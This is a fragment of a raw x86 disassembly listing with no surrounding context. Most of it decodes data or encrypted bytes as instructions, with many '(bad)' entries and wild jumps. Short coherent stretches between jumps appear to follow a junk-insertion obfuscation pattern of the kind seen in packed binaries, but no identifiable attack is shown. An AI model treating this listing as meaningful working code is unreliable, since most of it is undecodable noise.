  426d8e:	iret   
  426d8f:	neg    BYTE PTR [esi-0x36]
  426d92:	lods   eax,DWORD PTR ds:[esi]
  426d93:	in     al,0xce
  426d95:	arpl   WORD PTR [ebp-0x39],si
  426d98:	pop    esp
  426d99:	fisub  DWORD PTR [ecx]
  426d9b:	mov    dh,0x73
  426d9d:	stos   DWORD PTR es:[edi],eax
  426d9e:	and    BYTE PTR [edx],dl
  426da0:	addr16 cli 
  426da2:	and    BYTE PTR ds:0xa79a4ef2,dh
  426da8:	rcl    ebp,1
  426daa:	and    eax,0x6920e11
  426daf:	cmp    edx,ebx
  426db1:	repz lds ecx,FWORD PTR [edi+0x580ab8a0]
  426db8:	lea    edx,[esi+0x4f]
  426dbb:	mov    edi,DWORD PTR [esi]
  426dbd:	fstp   DWORD PTR [eax+0x6e]
  426dc0:	sbb    ecx,DWORD PTR [edi+0xb99d0d2]
  426dc6:	loopne 0x426d4e
  426dc8:	cmc    
  426dc9:	or     BYTE PTR [edi+0x4ab788f0],bl
  426dcf:	add    esp,esp
  426dd1:	push   es
  426dd2:	dec    ecx
  426dd3:	mov    eax,0x5c640f7b
  426dd8:	mov    ds:0xc5fbb96e,eax
  426ddd:	push   ss
  426dde:	cmp    al,0xc8
  426de0:	jb     0x426d9e
  426de2:	ins    BYTE PTR es:[edi],dx
  426de3:	lahf   
  426de4:	cdq    
  426de5:	pop    ebp
  426de6:	xchg   BYTE PTR [ebx+0x4e],bh
  426de9:	pop    edi
  426dea:	xor    DWORD PTR [ecx],ecx
  426dec:	jmp    0x86e902b4
  426df1:	aam    0x1b
  426df3:	fwait
  426df4:	pop    ss
  426df5:	push   ds
  426df6:	sti    
  426df7:	shl    DWORD PTR [edx+0x22],0xb3
  426dfb:	test   al,0x58
  426dfd:	mov    dh,0x7b
  426dff:	sub    cl,bh
  426e01:	int    0x4b
  426e03:	or     ebx,DWORD PTR [ebp+0x78]
  426e06:	or     eax,0x123f
  426e0b:	jmp    0x426eeb
  426e10:	fwait
  426e11:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  426e13:	(bad)  
  426e15:	(bad)  
  426e17:	fs push cs
  426e19:	aaa    
  426e1a:	xchg   BYTE PTR [ebx],dh
  426e1c:	int3   
  426e1d:	inc    edi
  426e1e:	sub    ah,ah
  426e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e21:	retf   
  426e22:	add    DWORD PTR [eax],eax
  426e24:	ret    
  426e25:	add    BYTE PTR [eax],al
  426e27:	add    BYTE PTR [edi-0x1438fa63],bh
  426e2d:	js     0x426e6a
  426e2f:	aas    
  426e30:	ja     0x426dcc
  426e32:	xchg   esp,eax
  426e33:	mov    esi,gs
  426e35:	sub    eax,0xd5a1f458
  426e3a:	dec    eax
  426e3b:	jcxz   0x426e5d
  426e3e:	xor    eax,0x5f3e31de
  426e43:	adc    bh,ch
  426e45:	inc    esi
  426e46:	add    eax,0xad057c6e
  426e4b:	jbe    0x426e77
  426e4d:	push   esi
  426e4e:	xor    al,cl
  426e50:	loop   0x426e00
  426e52:	sahf   
  426e53:	cld    
  426e54:	icebp  
  426e55:	and    al,0x61
  426e57:	mov    esi,0x33508198
  426e5c:	in     al,dx
  426e5d:	jnp    0x426e7f
  426e5f:	push   ss
  426e60:	imul   cl
  426e62:	call   0x59f3c4b4
  426e67:	push   edx
  426e68:	inc    edi
  426e69:	ja     0x426e72
  426e6b:	nop
  426e6c:	pusha  
  426e6d:	sbb    eax,0xce5e247e
  426e72:	cmp    edx,DWORD PTR [ecx-0x55]
  426e75:	popa   
  426e76:	js     0x426e08
  426e78:	mov    WORD PTR es:[ecx-0x51],ds
  426e7c:	jg     0x426e95
  426e7e:	sar    eax,cl
  426e80:	lds    esi,FWORD PTR [ebx-0x1e]
  426e83:	pop    ecx
  426e84:	or     edx,DWORD PTR [eax+edi*8+0x7a]
  426e88:	(bad)  
  426e89:	enter  0x17d9,0x21
  426e8d:	aas    
  426e8e:	mov    DWORD PTR [eax-0x45],esi
  426e91:	les    edi,FWORD PTR [eax-0x6d7694b2]
  426e97:	lods   eax,DWORD PTR ds:[esi]
  426e98:	std    
  426e99:	add    ah,dh
  426e9b:	jne    0x426e65
  426e9d:	stos   DWORD PTR es:[edi],eax
  426e9e:	js     0x426e3e
  426ea0:	ins    DWORD PTR es:[edi],dx
  426ea1:	out    dx,eax
  426ea2:	xor    BYTE PTR [ecx+0x3c4d3591],0xef
  426ea9:	jno    0x426eb4
  426eab:	mov    ah,0x76
  426ead:	and    BYTE PTR [esi+0x4d],ah
  426eb0:	inc    esp
  426eb1:	fisttp WORD PTR [eax-0x5c36f6e5]
  426eb7:	nop
  426eb8:	xor    BYTE PTR [ebx-0x65],al
  426ebb:	jb     0x426ed1
  426ebd:	js     0x426e47
  426ebf:	sub    ecx,ecx
  426ec1:	add    BYTE PTR [eax],dh
  426ec3:	pop    ss
  426ec4:	das    
  426ec5:	(bad)  
  426ec6:	hlt    
  426ec7:	xchg   edi,eax
  426ec8:	rol    DWORD PTR [edi+0x58],cl
  426ecb:	mov    ds:0x6bc66388,eax
  426ed0:	test   al,0xb0
  426ed2:	stos   DWORD PTR es:[edi],eax
  426ed3:	xor    DWORD PTR [ebp+0x2b],eax
  426ed6:	rcr    DWORD PTR [esi+eax*1+0x49756b07],cl
  426edd:	aaa    
  426ede:	cs and eax,0xe1e3f156
  426ee4:	lods   eax,DWORD PTR ds:[esi]
  426ee5:	popa   
  426ee6:	and    eax,0x2906ec48
  426eeb:	xor    eax,ecx
  426eed:	mov    ecx,DWORD PTR [esp+0x3c]
  426ef1:	or     eax,ecx
  426ef3:	mov    ecx,DWORD PTR [esp+0x40]
  426ef7:	jmp    0x426fd7
  426efc:	outs   dx,BYTE PTR ds:[esi]
  426efd:	jae    0x426f0f
  426eff:	gs sbb eax,0x417b7f67
  426f05:	mov    ebp,0xd7915913
  426f0a:	js     0x426f7c
  426f0c:	push   0xffffffcc
  426f0e:	add    DWORD PTR [eax],eax
  426f10:	ret    
  426f11:	add    BYTE PTR [eax],al
  426f13:	add    al,ch
  426f15:	aas    
  426f16:	inc    esi
  426f17:	mov    cl,0x4
  426f19:	pusha  
  426f1a:	and    BYTE PTR ds:[ecx],bl
  426f1d:	out    0x32,al
  426f1f:	add    dh,dh
  426f21:	sub    dh,bh
  426f23:	xor    al,0xb9
  426f25:	xchg   ebx,eax
  426f26:	fbld   TBYTE PTR [esp+ebp*1-0x4a0c6ce5]
  426f2d:	jbe    0x426ef8
  426f2f:	xor    eax,0x23b17935
  426f34:	js     0x426ef3
  426f36:	jecxz  0x426f44
  426f38:	mov    ds:0x11556f2,al
  426f3d:	dec    DWORD PTR [esp+ebx*8]
  426f40:	jle    0x426f53
  426f42:	push   edi
  426f43:	(bad)  
  426f44:	fiadd  WORD PTR [esi]
  426f46:	sbb    DWORD PTR [edx+0x4c54be],0x672359a0
  426f50:	cmc    
  426f51:	mov    ah,0x62
  426f53:	icebp  
  426f54:	das    
  426f55:	sbb    eax,0x599846fc
  426f5a:	stos   BYTE PTR es:[edi],al
  426f5b:	(bad)  
  426f5c:	repnz mov esi,0xc41e1c7
  426f62:	and    al,0xcf
  426f64:	shl    DWORD PTR [ecx-0x43254cb2],cl
  426f6a:	mov    BYTE PTR [eax+0x16],dh
  426f6d:	xor    DWORD PTR [ebp-0x8206d0b],ebp
  426f73:	xchg   ebx,eax
  426f74:	daa    
  426f75:	pmaxub mm0,QWORD PTR [edx]
  426f78:	je     0x426fca
  426f7a:	mov    ds:0xf1c12f0a,al
  426f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f80:	xor    al,0xa6
  426f82:	into   
  426f83:	push   esi
  426f84:	aaa    
  426f85:	pop    ecx
  426f86:	and    esi,edx
  426f88:	sbb    al,0x50
  426f8a:	push   cs
  426f8b:	sub    BYTE PTR ds:0x66c4af1f,0xbb
  426f92:	retf   
  426f93:	xor    edx,DWORD PTR [ebx+0x3b647c38]
  426f99:	bnd jmp 0x23bdea96
  426f9f:	bound  esi,QWORD PTR [esi-0x1a]
  426fa2:	adc    eax,0xf0c601ec
  426fa7:	sti    
  426fa8:	push   ebx
  426fa9:	mov    al,ds:0xb504b6be
  426fae:	int    0x86
  426fb0:	dec    esp
  426fb1:	dec    ebx
  426fb2:	ds add al,0x94
  426fb5:	out    dx,ax
  426fb7:	(bad)  
  426fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fb9:	push   ss
  426fba:	sbb    al,BYTE PTR ds:0x20069a0e
  426fc0:	push   edx
  426fc1:	or     BYTE PTR [edx],al
  426fc3:	sbb    DWORD PTR ds:0x799744f5,ebp
  426fc9:	bound  eax,QWORD PTR [edi-0x1e]
  426fcc:	nop
  426fcd:	loop   0x426f80
  426fcf:	gs sbb al,0x35
  426fd2:	les    edx,FWORD PTR [edi]
  426fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fd5:	sub    al,0x8b
  426fd7:	xor    edx,edx
  426fd9:	div    ecx
  426fdb:	mov    DWORD PTR ds:0x433624,0x20df
  426fe5:	mov    ecx,DWORD PTR [esp+0x18]
  426fe9:	mov    esi,0x8dacd260
  426fee:	mov    edi,0x66479db3
  426ff3:	mov    DWORD PTR ds:0x4335f0,0x145d
  426ffd:	cmp    eax,ecx
  426fff:	mov    DWORD PTR ds:0x433640,0xe8b
  427009:	ja     0x42761f
  42700f:	mov    eax,0x5550
  427014:	mov    eax,ds:0x4333dc
  427019:	jmp    0x4270f9
  42701e:	or     ah,al
  427020:	scas   al,BYTE PTR es:[edi]
  427021:	push   0xe2ce6eee
  427026:	mov    cl,dh
  427028:	and    BYTE PTR [edx],al
  42702a:	nop
  42702b:	lods   eax,DWORD PTR ds:[esi]
  42702c:	mov    bh,0x1c
  42702e:	sub    eax,0xc30001cd
  427033:	add    BYTE PTR [eax],al
  427035:	add    ah,cl
  427037:	mov    dl,0x4e
  427039:	and    BYTE PTR [edx+eiz*1],ah
  42703c:	stos   DWORD PTR es:[edi],eax
  42703d:	or     al,0x5
  42703f:	jo     0x427016
  427041:	jno    0x426fda
  427043:	cmp    al,0xca
  427045:	mov    ebx,esi
  427047:	mov    bl,0x3d
  427049:	jl     0x426ff4
  42704b:	add    DWORD PTR [ebp-0x6e],eax
  42704e:	mov    esi,0x805e59db
  427053:	sti    
  427054:	xchg   edi,eax
  427055:	cdq    
  427056:	add    al,BYTE PTR [esi]
  427058:	xchg   edi,eax
  427059:	scas   al,BYTE PTR es:[edi]
  42705a:	loopne 0x427080
  42705c:	jl     0x42705b
  42705e:	xor    DWORD PTR [edx],edi
  427060:	and    bh,ah
  427062:	dec    edi
  427063:	dec    esi
  427064:	jns    0x427063
  427066:	mov    fs:0x2e402e01,eax
  42706c:	dec    esi
  42706d:	addr16 out dx,eax
  42706f:	sti    
  427070:	mov    ebx,?
  427072:	gs mov ebp,0xe0a52fed
  427078:	xchg   edx,eax
  427079:	lods   eax,DWORD PTR ds:[esi]
  42707a:	mov    ebx,0x5feb2a21
  42707f:	xchg   esp,eax
  427080:	xchg   edx,eax
  427081:	xchg   edi,eax
  427082:	mov    esp,gs
  427084:	ret    
  427085:	xchg   BYTE PTR [esi-0x1dbba5af],dh
  42708b:	pop    ebx
  42708c:	ins    DWORD PTR es:[edi],dx
  42708d:	jmp    0xd3d8934f
  427092:	icebp  
  427093:	jp     0x427024
  427095:	fwait
  427096:	dec    edi
  427097:	sbb    al,0x9e
  427099:	xor    ch,cl
  42709b:	popa   
  42709c:	enter  0x8cd3,0x15
  4270a0:	mov    eax,ds:0xbc09c10c
  4270a5:	push   0xffffff97
  4270a7:	sub    BYTE PTR [eax-0x29f6512f],dh
  4270ad:	or     BYTE PTR [esi+0x7c],0x18
  4270b1:	mov    ds:0x9a711c47,eax
  4270b6:	sbb    ah,BYTE PTR [esi]
  4270b8:	arpl   sp,cx
  4270ba:	xor    DWORD PTR [edx-0x45],edi
  4270bd:	push   ebp
  4270be:	mov    ecx,0x48fefd59
  4270c3:	xor    bl,BYTE PTR [ebx+0x77b9d39d]
  4270c9:	cwde   
  4270ca:	(bad)  
  4270cb:	fcom   QWORD PTR [ecx-0x61]
  4270ce:	adc    ch,BYTE PTR [edx-0x29e9773e]
  4270d4:	pop    edi
  4270d5:	arpl   WORD PTR [ebx-0x3a79a268],ax
  4270db:	addr16 js 0x4270d8
  4270de:	loopne 0x427079
  4270e0:	dec    edx
  4270e1:	push   es
  4270e2:	leave  
  4270e3:	stc    
  4270e4:	xchg   ebp,eax
  4270e5:	lods   eax,DWORD PTR ds:[esi]
  4270e6:	fbstp  TBYTE PTR [esi]
  4270e8:	(bad)
  4270ed:	mov    edx,0x881f3861
  4270f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270f3:	cs addr16 jg 0x42716a
  4270f7:	mov    ebx,0xc0df3d3d
  4270fc:	mov    al,ds:0x1405c751
  427101:	ss inc ebx
  427103:	add    ch,cl
  427105:	aaa    
  427106:	add    BYTE PTR [eax],al
  427108:	jne    0x42761f
  42710e:	mov    eax,DWORD PTR [esp+0x10]
  427112:	mov    ecx,DWORD PTR [esp+0x14]
  427116:	cmp    DWORD PTR ds:0x433538,0x0
  42711d:	jbe    0x427142
  427123:	and    DWORD PTR ds:0x4335b0,0x7059
  42712d:	add    DWORD PTR ds:0x43355c,0x17f5
  427137:	jmp    0x427142
  42713c:	call   DWORD PTR ds:0x43c7f0
  427142:	mov    ecx,DWORD PTR ds:0x4331b4
  427148:	mov    ecx,DWORD PTR [ecx+0x198]
  42714e:	jmp    0x42722e
  427153:	repnz imul ebx,DWORD PTR [edi],0xf3fe9fec
  42715a:	jg     0x4271c7
  42715c:	sub    eax,0x8b6c5f24
  427161:	and    BYTE PTR [ecx+0x1cdf0],ah
  427167:	ret    
  427168:	add    BYTE PTR [eax],al
  42716a:	add    BYTE PTR [ebx],bl
  42716c:	jecxz  0x427135
  42716e:	aaa    
  42716f:	ja     0x42712c
  427171:	shr    esi,1
  427173:	sub    al,dh
  427175:	pop    ebp
  427176:	jl     0x42715c
  427178:	push   0x330aac7c
  42717d:	sub    ecx,DWORD PTR [eax-0x3a959e0]
  427183:	test   DWORD PTR [ecx+0x58],0xd2f8535f
  42718a:	(bad)  
  42718b:	ja     0x42717d
  42718d:	stc    
  42718e:	retf   
  42718f:	add    ah,BYTE PTR [esi-0x42]
  427192:	mov    cr3,eax
  427195:	(bad)  
  427196:	call   DWORD PTR [esi-0x4d68e388]
  42719c:	cld    
  42719d:	rcr    DWORD PTR [edx],cl
  42719f:	lahf   
  4271a0:	dec    esi
  4271a1:	push   cs
  4271a2:	shl    BYTE PTR [ecx+0x5a],0xbf
  4271a6:	xor    BYTE PTR [esi],bl
  4271a8:	loope  0x4271f3
  4271aa:	inc    edi
  4271ab:	jl     0x427213
  4271ad:	jecxz  0x42719f
  4271af:	mov    edi,0xfddacc44
  4271b4:	xchg   esi,eax
  4271b5:	data16 lods al,BYTE PTR ds:[esi]
  4271b7:	(bad)  
  4271b8:	pushf  
  4271b9:	outs   dx,BYTE PTR ds:[esi]
  4271ba:	je     0x427236
  4271bc:	fldenv [ecx]
  4271be:	push   ecx
  4271bf:	xchg   ebp,eax
  4271c0:	pop    di
  4271c2:	sahf   
  4271c3:	shr    edx,1
  4271c5:	jbe    0x42717c
  4271c7:	pop    esp
  4271c8:	or     BYTE PTR ds:0x96145d1,dh
  4271ce:	fsub   DWORD PTR [ecx+edx*8]
  4271d1:	cmp    DWORD PTR [esi+0x3611f4b8],ebx
  4271d7:	test   al,0x1b
  4271d9:	and    DWORD PTR [ebx+0x7be95e91],ebp
  4271df:	ds enter 0x68f6,0xfa
  4271e4:	push   esi
  4271e5:	xchg   esi,eax
  4271e6:	mov    edi,0xc82d1d31
  4271eb:	and    DWORD PTR [ebx],ebp
  4271ed:	pop    edi
  4271ee:	pop    es
  4271ef:	adc    edx,DWORD PTR [ecx+0x8dc5b4d]
  4271f5:	data16 add BYTE PTR [ecx+0x5af62275],0xbf
  4271fd:	rcl    DWORD PTR [ecx+0x7e],1
  427200:	jbe    0x4271a4
  427202:	les    ebp,FWORD PTR ds:0xc9f809f7
  427208:	or     bh,0xf3
  42720b:	pop    eax
  42720c:	aas    
  42720d:	jb     0x42727e
  42720f:	add    DWORD PTR [edi],eax
  427211:	add    BYTE PTR [edx-0x346ec92],ah
  427217:	sahf   
  427218:	mov    al,0xe7
  42721a:	std    
  42721b:	ins    DWORD PTR es:[edi],dx
  42721c:	nop
  42721d:	sbb    BYTE PTR [ecx+0x0],bl
  427220:	(bad)  
  427221:	mov    ebx,0x44717031
  427226:	pop    eax
  427227:	push   0xc068b585
  42722c:	out    dx,al
  42722d:	stos   BYTE PTR es:[edi],al
  42722e:	xor    eax,esi
  427230:	sub    eax,edi
  427232:	jmp    0x427312
  427237:	clc    
  427238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427239:	cmp    eax,0xfaff7def
  42723e:	mov    bh,0x31
  427240:	dec    edi
  427241:	iret   
  427242:	jo     0x4271f7
  427244:	fnstcw WORD PTR [esi]
  427246:	cmp    DWORD PTR [ebx-0x3cfffe32],esi
  42724c:	add    BYTE PTR [eax],al
  42724e:	add    BYTE PTR [ecx+0x5016947e],al
  427254:	push   ebx
  427255:	out    dx,eax
  427256:	pop    edi
  427257:	test   eax,0xeb225eb2
  42725c:	dec    ebp
  42725d:	jmp    0xdb6c:0xc7bfb591
  427264:	sbb    bh,ch
  427266:	dec    ecx
  427267:	jp     0x427293
  427269:	pop    eax
  42726a:	xchg   ecx,eax
  42726b:	es dec ecx
  42726d:	push   esp
  42726e:	jmp    0xed61:0x15c71118
  427275:	test   eax,0x632613f7
  42727a:	pop    ss
  42727b:	(bad)  
  42727c:	sti    
  42727d:	pop    edx
  42727e:	hlt    
  42727f:	iret   
  427280:	mov    dh,0x74
  427282:	sub    al,0x87
  427284:	pop    eax
  427285:	in     eax,0xf1
  427287:	daa    
  427288:	out    dx,al
  427289:	sbb    eax,0x9593ddd4
  42728e:	jns    0x427230
  427290:	xor    al,0x26
  427292:	int    0xb7
  427294:	(bad)  [eax]
  427296:	(bad)  
  427297:	jmp    DWORD PTR [ebx]
  427299:	and    al,0x54
  42729b:	fwait
  42729c:	and    bl,BYTE PTR [ecx-0x57175683]
  4272a2:	out    dx,al
  4272a3:	ret    0xcb2c
  4272a6:	stc    
  4272a7:	iret   
  4272a8:	lds    ecx,FWORD PTR [ebx]
  4272aa:	(bad)  
  4272ab:	pop    ebx
  4272ac:	mov    eax,0x6b15ad3c
  4272b1:	dec    ecx
  4272b2:	(bad)
  4272b5:	mov    edi,0x1f236042
  4272ba:	sahf   
  4272bb:	mov    esi,0x3d398b06
  4272c0:	addr16 and ebp,0x6d
  4272c4:	inc    edi
  4272c5:	and    al,0xb7
  4272c7:	ds mov cl,0xfd
  4272ca:	xchg   esp,eax
  4272cb:	icebp  
  4272cc:	adc    ch,ch
  4272ce:	mov    cl,ah
  4272d0:	pop    esi
  4272d1:	(bad)  
  4272d2:	cmp    DWORD PTR [edi-0x63],edi
  4272d5:	mov    ebx,0x1dee7958
  4272da:	adc    al,0x4
  4272dc:	(bad)  
  4272dd:	adc    eax,DWORD PTR [ebp-0x69]
  4272e0:	xchg   ebp,eax
  4272e1:	pop    eax
  4272e2:	dec    esi
  4272e3:	mov    eax,ss:0x18da13dd
  4272e9:	inc    edx
  4272ea:	push   esp
  4272eb:	push   0x62
  4272ed:	inc    ebx
  4272ee:	or     BYTE PTR [esi+0x52679592],cl
  4272f4:	push   eax
  4272f5:	sbb    BYTE PTR [ebx-0x46],al
  4272f8:	in     al,0x10
  4272fa:	(bad)
  4272fd:	cs mov ebx,0x6fc51343
  427303:	sbb    DWORD PTR [eax+edx*4-0x78],ebx
  427307:	jecxz  0x4272af
  427309:	pushf  
  42730a:	mov    edx,0x591e5d58
  42730f:	cmp    dl,BYTE PTR [ebp-0x52]
  427312:	mov    DWORD PTR [ecx],eax
  427314:	sbb    DWORD PTR ds:0x433538,ebx
  42731a:	mov    eax,DWORD PTR [esp+0x10]
  42731e:	or     ecx,DWORD PTR ds:0x4335d8
  427324:	jmp    0x427404
  427329:	cmp    eax,0xdfe69f75
  42732e:	out    dx,al
  42732f:	jge    0x427330
  427331:	inc    edi
  427332:	js     0x42733d
  427334:	xchg   edx,eax
  427335:	scas   eax,DWORD PTR es:[edi]
  427336:	inc    esi
  427337:	outs   dx,BYTE PTR ds:[esi]
  427338:	or     eax,0x1cf76
  42733d:	ret    
  42733e:	add    BYTE PTR [eax],al
  427340:	add    BYTE PTR [esi+ecx*8],dh
  427343:	mov    dl,0x8e
  427345:	push   es
  427346:	(bad)  
  427347:	fisubr WORD PTR [eax]
  427349:	and    BYTE PTR [ecx+0x1754c0d3],cl
  42734f:	jno    0x4272f3
  427351:	cmp    eax,0xbb2f0fc4
  427356:	fld    QWORD PTR [ebx-0x75]
  427359:	xor    ch,BYTE PTR [edi+esi*1+0x7fb6ec1]
  427360:	jl     0x42730a
  427362:	mov    al,0x2e
  427364:	or     BYTE PTR [eax],dh
  427366:	outs   dx,DWORD PTR ds:[esi]
  427367:	add    BYTE PTR [esp+ebx*8-0x756e0eb0],bl
  42736e:	mov    edi,0xbd99b401
  427373:	mov    dl,0x21
  427375:	rol    BYTE PTR [esi+0x753ab814],0x3e
  42737c:	cmp    eax,DWORD PTR [ebp-0x502155a2]
  427382:	push   esp
  427383:	lds    ebp,FWORD PTR [edi+ebp*1-0x304d1b2a]
  42738a:	push   esp
  42738b:	dec    esi
  42738c:	loopne 0x427379
  42738e:	or     edx,DWORD PTR [ecx+0x511defb6]
  427394:	sbb    eax,0x65afb681
  427399:	jmp    0x215d:0x4a18e56d
  4273a0:	xor    DWORD PTR [eax],ecx
  4273a2:	mov    esp,0xf6721dc8
  4273a7:	ss test eax,0xe8f0f215
  4273ad:	dec    ecx
  4273ae:	call   0x17e1:0x702deaba
  4273b5:	(bad)  
  4273b6:	cld    
  4273b7:	add    bh,BYTE PTR [edx+0x3c]
  4273ba:	mov    edi,0x69a2fae2
  4273bf:	xchg   DWORD PTR [edi+edi*1+0x19],edi
  4273c3:	hlt    
  4273c4:	shr    DWORD PTR [ebp+esi*8+0x6daa7577],0x80
  4273cc:	adc    eax,0x5983d344
  4273d1:	jno    0x427413
  4273d3:	in     al,dx
  4273d4:	daa    
  4273d5:	test   ecx,ebp
  4273d7:	or     DWORD PTR [ebx+0x5a9d8109],ecx
  4273dd:	str    edi
  4273e0:	mov    eax,ds:0x66f5da2a
  4273e5:	xor    BYTE PTR [eax-0x206008bf],0xaf
  4273ec:	ret    
  4273ed:	std    
  4273ee:	js     0x4273ec
  4273f0:	mov    dl,0x1c
  4273f2:	scas   eax,DWORD PTR es:[edi]
  4273f3:	daa    
  4273f4:	test   BYTE PTR [eax],0x30
  4273f7:	ja     0x4273ab
  4273f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273fa:	mov    ebx,0x79b1c85
  4273ff:	scas   al,BYTE PTR es:[edi]
  427400:	imul   ebp,edx,0x4c8b5174
  427406:	and    al,0x14
  427408:	xor    DWORD PTR ds:0x433530,edi
  42740e:	xor    eax,esi
  427410:	cmp    DWORD PTR ds:0x433548,0x0
  427417:	jle    0x427441
  42741d:	or     ecx,DWORD PTR ds:0x4335b0
  427423:	jmp    0x427441
  427428:	push   0x6a8d
  42742d:	push   0x8a8e
  427432:	push   DWORD PTR [ebp-0x24]
  427435:	push   DWORD PTR [ebp-0x1c]
  427438:	push   DWORD PTR [ebp-0x28]
  42743b:	call   DWORD PTR ds:0x43c7f4
  427441:	sub    eax,edi
  427443:	jmp    0x427523
  427448:	lods   eax,DWORD PTR ds:[esi]
  427449:	cs in  eax,0xc5
  42744c:	out    0xcf,eax
  42744e:	lods   eax,DWORD PTR ds:[esi]
  42744f:	outs   dx,BYTE PTR ds:[esi]
  427450:	inc    ecx
  427451:	sub    BYTE PTR [edx+eax*1+0x13],bl
  427455:	sbb    DWORD PTR [esi],0xffffffcd
  427458:	cmp    eax,edx
  42745a:	add    DWORD PTR [eax],eax
  42745c:	ret    
  42745d:	add    BYTE PTR [eax],al
  42745f:	add    dh,ah
  427461:	dec    eax
  427462:	cmp    al,0x3f
  427464:	mov    BYTE PTR [esi-0x60],ch
  427467:	pop    esp
  427468:	and    dl,dl
  42746a:	push   cs
  42746b:	jl     0x42749f
  42746d:	je     0x4274ac
  42746f:	dec    ebx
  427470:	mov    dh,BYTE PTR [esi]
  427472:	dec    eax
  427473:	nop
  427474:	mov    esp,esp
  427476:	(bad)  
  427477:	mov    eax,0xb5b15226
  42747c:	pop    ebp
  42747d:	fucomp st(3)
  42747f:	jp     0x4274d1
  427481:	out    0x65,al
  427483:	pop    edx
  427484:	das    
  427485:	pop    ebp
  427486:	ret    0x3381
  427489:	std    
  42748a:	adc    BYTE PTR [ebp+ecx*4+0x42],dh
  42748e:	mov    esp,0xcd422d24
  427493:	(bad)
  427497:	add    esp,DWORD PTR [eax-0x5c615a28]
  42749d:	push   edi
  42749e:	test   al,0x39
  4274a0:	scas   eax,DWORD PTR es:[edi]
  4274a1:	fisttp WORD PTR [eax+0x5fa1a3d1]
  4274a7:	test   BYTE PTR [ecx-0x1f],0x18
  4274ab:	push   edx
  4274ac:	xchg   esi,eax
  4274ad:	loope  0x4274e6
  4274af:	ret    
  4274b0:	jl     0x427473
  4274b2:	arpl   WORD PTR [edx+0xb6a1535],si
  4274b8:	test   al,0xc0
  4274ba:	jbe    0x4274d9
  4274bc:	int    0xf5
  4274be:	inc    eax
  4274bf:	pop    ss
  4274c0:	mov    ds:0x67b208f3,eax
  4274c5:	push   eax
  4274c6:	ss call 0x826d746b
  4274cc:	and    ah,BYTE PTR [edi]
  4274ce:	inc    ebx
  4274cf:	pushf  
  4274d0:	or     dl,BYTE PTR ds:0x68422a69
  4274d6:	call   FWORD PTR [eax]
  4274d8:	sbb    ecx,DWORD PTR [edi]
  4274da:	add    edi,edi
  4274dc:	inc    edx
  4274dd:	rcr    DWORD PTR [edx],1
  4274df:	dec    edi
  4274e0:	lods   al,BYTE PTR ds:[esi]
  4274e1:	cmp    BYTE PTR [ecx+0x380befa],0x7f
  4274e8:	xor    ch,bl
  4274ea:	xor    dl,bh
  4274ec:	outs   dx,DWORD PTR ds:[esi]
  4274ed:	iret   
  4274ee:	mov    cl,0xb0
  4274f0:	div    BYTE PTR [ebx-0x22afea6d]
  4274f6:	(bad)  
  4274f7:	sti    
  4274f8:	add    eax,0xc11d493a
  4274fd:	cmp    ecx,DWORD PTR [ebx+esi*8]
  427500:	dec    edx
  427501:	inc    esp
  427502:	push   0xc3b5598b
  427507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427508:	and    eax,DWORD PTR [edx+0xc972524]
  42750e:	sysenter 
  427510:	push   ebx
  427511:	pushf  
  427512:	push   0x2e37a948
  427517:	sub    BYTE PTR [edx+0x263f1c81],bh
  42751d:	cmovp  edi,ebx
  427520:	rcl    ebp,cl
  427522:	mov    ah,0xa3
  427524:	fdiv   QWORD PTR [ebx]
  427526:	inc    ebx
  427527:	add    cl,ch
  427529:	fild   DWORD PTR [eax]
  42752b:	add    BYTE PTR [eax],al
  42752d:	sbb    BYTE PTR [esi+0x61],ah
  427530:	idiv   BYTE PTR [edi-0x9]
  427533:	lahf   
  427534:	out    dx,al
  427535:	mov    fs,ebx
  427537:	adc    al,0x33
  427539:	jmp    0xfd0a0889
  42753e:	rol    BYTE PTR [ecx],1
  427540:	add    bl,al
  427542:	add    BYTE PTR [eax],al
  427544:	add    BYTE PTR [ebx+0x1a],bh
  427547:	inc    eax
  427548:	adc    eax,0x2db90c4f
  42754d:	mov    ebp,0xf6d4c754
  427552:	jae    0x427516
  427554:	rol    DWORD PTR [ebp+0x72],cl
  427557:	sahf   
  427558:	sub    DWORD PTR [ebx],ebp
  42755a:	fcmovbe st,st(6)
  42755c:	rcl    BYTE PTR cs:[esi+0x75a73619],0x12
  427564:	outs   dx,DWORD PTR ds:[esi]
  427565:	sti    
  427566:	cdq    
  427567:	das    
  427568:	lods   al,BYTE PTR ds:[esi]
  427569:	xchg   esi,eax
  42756a:	cmp    ch,cl
  42756c:	push   edx
  42756d:	dec    ebp
  42756e:	adc    eax,0xc34d82f0
  427573:	leave  
  427574:	jmp    0x93d848e3
  427579:	scas   al,BYTE PTR es:[edi]
  42757a:	(bad)  
  42757b:	stos   BYTE PTR es:[edi],al
  42757c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42757d:	jmp    0x931:0x63a9da5d
  427584:	repz fcomp st(2)
  427587:	call   0xc0a57d43
  42758c:	or     eax,esp
  42758e:	adc    edx,DWORD PTR [ebx]
  427590:	and    eax,0x3e4c727c
  427595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427596:	iret   
  427597:	mov    eax,ds:0x8e976f74
  42759c:	xor    DWORD PTR [ecx-0x53],0xd1117fb2
  4275a3:	in     al,dx
  4275a4:	test   al,0xa1
  4275a6:	jns    0x427583
  4275a8:	mov    bl,0xf6
  4275aa:	outs   dx,DWORD PTR ds:[esi]
  4275ab:	mov    esp,0xc92b5628
  4275b0:	scas   eax,DWORD PTR es:[edi]
  4275b1:	(bad)  
  4275b2:	out    dx,al
  4275b3:	ss repnz inc esp
  4275b6:	jb     0x42762e
  4275b8:	fwait
  4275b9:	stos   WORD PTR es:[edi],ax
  4275bb:	xor    esi,DWORD PTR [ebx-0x23]
  4275be:	into   
  4275bf:	jle    0x4275d7
  4275c1:	iret   
  4275c2:	sub    dh,0xbb
  4275c5:	xchg   esp,eax
  4275c6:	inc    edi
